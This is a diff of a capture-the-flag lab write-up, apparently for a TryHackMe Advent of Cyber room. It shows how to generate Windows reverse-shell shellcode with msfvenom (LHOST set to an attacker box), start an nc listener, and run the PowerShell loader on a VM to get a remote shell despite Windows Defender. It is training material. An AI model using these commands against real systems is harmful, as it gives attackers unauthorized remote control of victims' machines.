@@ -9,6 +9,7 @@
 Let's learn how to generate a shellcode to see what it looks like. To do this, we will use a tool called `msfvenom` to get a reverse shell.  
 
 In the **AttackBox**, open the terminal and enter the command `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=1111 -f powershell` that will generate the shellcode. Replace the `ATTACKBOX_IP` with the IP of the AttackBox (mine: **10.10.123.115**):
+
 ![image](https://github.com/user-attachments/assets/efcef4c5-f2eb-40a0-9032-d6474be9445a)
 
 The command (`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=1111 -f powershell`) generates a piece of shellcode using `msfvenom`. Here's what each part means:
@@ -19,7 +20,6 @@ The command (`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT
 - `-f powershell`: This specifies the format for the output. In this case, we want the payload to be in PowerShell format so it can be executed as a script on a Windows machine.
 
 ### Time for Some Action - Executing the Shellcode
-
 1. On the **AttackBox**, execute the command `nc -nvlp 1111` to start a listener on port 1111 and wait for an incoming connection. This command opens port 1111 and listens for connections, allowing the AttackBox to receive data once a connection is made.
 
 2. On the **AttackBox**, begin by navigating to the Desktop. Right-click on the Desktop, select Create Document, and then choose Empty File. Open this new file and paste the previously provided PowerShell script code (on [THM](https://tryhackme.com/r/room/adventofcyber2024)) into it.
@@ -29,15 +29,18 @@ The command (`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT
 4. Once you've added the shellcode navigate to the attached **VM**, open PowerShell by clicking the PowerShell icon on the taskbar and piece by piece, paste the code from the document you recently created to the Windows PowerShell window.
 
 5. Once you've finished copy-pasting, press Enter.
+
 ![image](https://github.com/user-attachments/assets/5c3e434c-307d-45b6-9bbc-dd58e3b844b9)
 
 >[!note]
 >If your PowerShell terminal unexpectedly closes, it means your `nc` listener was not reachable, possibly because it was not running or was listening on the wrong port or IP.
 
 6. Once you execute the final line in the PowerShell terminal and press Enter, you will get a reverse shell in the AttackBox, giving you complete access to the computer even if the Windows Defender is enabled.
+
 ![image](https://github.com/user-attachments/assets/216eb1f0-860f-4424-aa66-5c75d7e798fe)
 
 7. Now you can issue any command, like issuing `dir`, which will list all the directories.
+
 ![image](https://github.com/user-attachments/assets/5d3eced2-9fb4-4754-9818-f6a13659b00f)
 
 ### Regaining Access
@@ -51,6 +54,7 @@ Can you help Glitch identify and update the shellcode with the correct IP and po
 4. In a new document copy and paste the PowerShell script on THM, putting the newly created shellcode in.
 5. Copy and paste document text into the **VM** PowerShell.
 6. Return to AttackBox terminal: we have remote access.
+
 ![image](https://github.com/user-attachments/assets/fde7bbb1-7133-47d0-baea-18a7cfebae2c)
 
 ### Answers
